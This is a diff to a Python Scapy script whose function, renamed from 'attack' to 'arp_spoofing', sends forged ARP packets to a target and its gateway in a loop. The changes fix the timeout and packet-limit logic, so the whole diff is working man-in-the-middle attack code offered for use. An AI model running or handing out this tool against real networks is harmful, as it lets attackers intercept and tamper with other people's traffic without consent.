@@ -10,7 +10,14 @@ IS_AT_REQUEST = "is-at"
 def timeout_override(start_time, timeout):
     if timeout:
         timeout = datetime.timedelta(seconds=timeout)
-        return start_time + timeout >= datetime.now()
+        current_time = datetime.datetime.now()
+        return start_time + timeout <= current_time
+    return False
+
+
+def packets_override(packets_count, max_packets):
+    if max_packets:
+        return packets_count > max_packets
     return False
 
 
@@ -20,7 +27,7 @@ def print_status_message(packets_count, target):
     sys.stdout.flush()
 
 
-def attack(target, gateway, interval=1, verbose=True, timeout=None, max_packets=None):
+def arp_spoofing(target, gateway, interval=1, verbose=True, timeout=None, max_packets=None):
     """
     Perform an arp spoofing attack on the given target.
     :param target: target ip to attack.
@@ -33,8 +40,8 @@ def attack(target, gateway, interval=1, verbose=True, timeout=None, max_packets=
     target_packet = Ether() / ARP(op=WHO_HAS_REQUEST, psrc=gateway, pdst=target)
     gateway_packet = Ether() / ARP(op=IS_AT_REQUEST, psrc=target, pdst=gateway)
     packets_count = 0
-    start_time = datetime.now()
-    while not timeout_override(start_time, timeout) and packets_count < max_packets:
+    start_time = datetime.datetime.now()
+    while not timeout_override(start_time, timeout) and not packets_override(packets_count, max_packets):
         if verbose:
             print_status_message(packets_count, target)
         sendp(target_packet, verbose=False)
